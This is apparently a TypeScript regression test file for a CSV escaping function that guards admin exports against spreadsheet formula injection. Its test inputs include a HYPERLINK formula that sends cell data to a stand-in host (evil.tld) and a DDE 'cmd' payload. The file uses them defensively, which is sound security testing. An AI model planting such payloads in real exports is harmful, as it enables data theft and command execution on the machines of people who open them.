// TIM-1957: regression tests for csvEscape — formula-injection neutralization.
//
// Security Officer Finding A: signup_source is attacker-controlled via the
// public /login?signup_source= query param; full_name is user-set. If exported
// to CSV without neutralizing the formula triggers, Excel/Sheets evaluates
// =HYPERLINK / =cmd|... / @SUM / etc. on the admin's machine when they open
// the file. These tests pin the contract so the fix can't silently regress.

import { test } from "node:test";
import assert from "node:assert/strict";
import { csvEscape } from "./csv.ts";

test("neutralizes leading = (formula start)", () => {
  // =1+1 must become '=1+1 (prefixed) and then RFC-4180 quoted only if needed.
  // The single-quote prefix alone is enough; the value has no comma/quote/newline.
  assert.equal(csvEscape("=1+1"), "'=1+1");
});

test("neutralizes the Security Officer's exfiltration payload", () => {
  const payload = '=HYPERLINK("https://evil.tld/x?"&A1,"open")';
  const out = csvEscape(payload);
  // Must NOT begin with bare = once the leading-char check fires; must be
  // prefixed with ' and then RFC-4180 quoted because the payload contains ",".
  assert.ok(!/^=/.test(out), "must not start with raw =");
  assert.ok(out.startsWith('"\'='), "must be quoted and prefixed");
  // Round-trip: when the spreadsheet decodes the cell it sees a literal string
  // starting with '=, not a formula.
});

test("neutralizes +, -, @, tab, CR, LF formula triggers", () => {
  // Prefix applies; no RFC-4180 quoting because no comma/quote/newline in body.
  assert.equal(csvEscape("+cmd|'/c calc'!A0"), "'+cmd|'/c calc'!A0");
  assert.equal(csvEscape("-2+3"), "'-2+3");
  assert.equal(csvEscape("@SUM(A1:A9)"), "'@SUM(A1:A9)");
  // Leading tab triggers prefix; tab alone is not an RFC-4180 quoting char.
  assert.equal(csvEscape("\t=evil"), "'\t=evil");
  // Leading CR / LF: prefix AND quote (CR and LF require RFC-4180 quoting).
  assert.equal(csvEscape("\r=evil"), `"'\r=evil"`);
  assert.equal(csvEscape("\n=evil"), `"'\n=evil"`);
});

test("leaves safe values untouched (no prefix, no quoting)", () => {
  assert.equal(csvEscape("Pour Over Bar"), "Pour Over Bar");
  // Mid-string @ in a non-leading position is safe (no prefix).
  assert.equal(csvEscape("trent@example.com"), "trent@example.com");
  assert.equal(csvEscape("hello @world"), "hello @world");
});

test("RFC-4180 quoting still works for commas, quotes, and newlines", () => {
  assert.equal(csvEscape("Smith, John"), '"Smith, John"');
  assert.equal(csvEscape('he said "hi"'), '"he said ""hi"""');
  assert.equal(csvEscape("line1\nline2"), '"line1\nline2"');
});

test("null and undefined become empty cells", () => {
  assert.equal(csvEscape(null), "");
  assert.equal(csvEscape(undefined), "");
});

test("non-string values are stringified safely", () => {
  assert.equal(csvEscape(0), "0");
  assert.equal(csvEscape(42), "42");
  assert.equal(csvEscape(true), "true");
});
